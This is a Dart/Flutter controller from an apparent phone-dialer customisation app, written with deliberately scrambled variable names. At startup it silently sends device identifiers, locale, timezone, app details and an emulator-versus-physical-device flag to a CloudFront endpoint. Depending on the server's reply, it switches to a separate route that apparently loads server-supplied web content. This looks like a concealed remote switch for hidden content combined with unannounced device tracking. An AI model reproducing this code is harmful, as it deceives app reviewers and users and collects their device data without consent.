import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class DialEditLogic extends GetxController {

  var frlhyqdcg = RxBool(false);
  var xwjlguo = RxBool(true);
  var ceufnm = RxString("");
  var evelyn = RxBool(false);
  var denesik = RxBool(true);
  final prfyeiuk = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    movndzu();
  }


  Future<void> movndzu() async {

    evelyn.value = true;
    denesik.value = true;
    xwjlguo.value = false;

    prfyeiuk.post("https://d10xci2iwffivq.cloudfront.net/1xZHDH",data: await vfirpb()).then((value) {
      var jnqc = value.data["jnqc"] as String;
      var gnqi = value.data["gnqi"] as bool;
      if (gnqi) {
        ceufnm.value = jnqc;
        edison();
      } else {
        runolfsdottir();
      }
    }).catchError((e) {
      xwjlguo.value = true;
      denesik.value = true;
      evelyn.value = false;
    });
  }

  Future<Map<String, dynamic>> vfirpb() async {
    final DeviceInfoPlugin ocbuijr = DeviceInfoPlugin();
    PackageInfo pjrcogmz_fnrp = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var psburz = Platform.localeName;
    var ynCRtJk = currentTimeZone;

    var jUVHYJ = pjrcogmz_fnrp.packageName;
    var FAlisj = pjrcogmz_fnrp.version;
    var bhleDW = pjrcogmz_fnrp.buildNumber;

    var raTmWix = pjrcogmz_fnrp.appName;
    var NmrQ = "";
    var tdxUhDS  = "";
    var khJUpf = "";
    var caryLockman = "";
    var alexaGorczany = "";
    var ruthZiemann = "";


    var DpwRJU = "";
    var kIhua = false;

    if (GetPlatform.isAndroid) {
      DpwRJU = "android";
      var edtmrbs = await ocbuijr.androidInfo;

      khJUpf = edtmrbs.brand;

      NmrQ  = edtmrbs.model;
      tdxUhDS = edtmrbs.id;

      kIhua = edtmrbs.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      DpwRJU = "ios";
      var ouhwny = await ocbuijr.iosInfo;
      khJUpf = ouhwny.name;
      NmrQ = ouhwny.model;

      tdxUhDS = ouhwny.identifierForVendor ?? "";
      kIhua  = ouhwny.isPhysicalDevice;
    }
    var res = {
      "alexaGorczany" : alexaGorczany,
      "bhleDW": bhleDW,
      "FAlisj": FAlisj,
      "jUVHYJ": jUVHYJ,
      "raTmWix": raTmWix,
      "ynCRtJk": ynCRtJk,
      "khJUpf": khJUpf,
      "tdxUhDS": tdxUhDS,
      "psburz": psburz,
      "DpwRJU": DpwRJU,
      "kIhua": kIhua,
      "caryLockman" : caryLockman,
      "NmrQ": NmrQ,
      "ruthZiemann" : ruthZiemann,

    };
    return res;
  }

  Future<void> runolfsdottir() async {
    Get.offNamed("/dial_main");
  }

  Future<void> edison() async {
    Get.offNamed("/dial_word");
  }

}
